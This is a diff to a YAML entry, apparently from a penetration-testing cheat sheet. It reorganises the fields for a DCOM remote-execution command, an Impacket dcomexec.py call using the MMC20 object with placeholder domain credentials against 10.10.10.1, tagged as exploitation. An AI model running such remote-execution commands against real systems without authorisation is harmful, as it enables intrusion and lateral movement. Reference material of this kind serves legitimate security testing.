@@ -15,21 +15,16 @@ description: |
   	Password: password123
 
   	DCOM Object: MMC20
+command: |
+  python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1
 items:
-  Password:
-    - code: |
-        python3 dcomexec.py -object MMC20 test.local/john:password123@10.10.10.1
-  Username:
-    - code: |
-        empty
-filters:
-  DCOM:
-    - code: |
-        empty
-  Linux:
-    - code: |
-        empty
-  Windows:
-    - code: |
-        empty
+  - Password
+  - Username
+services:
+  - DCOM
+OS:
+  - Linux
+  - Windows
+attack_types:
+  - Exploitation
 ---
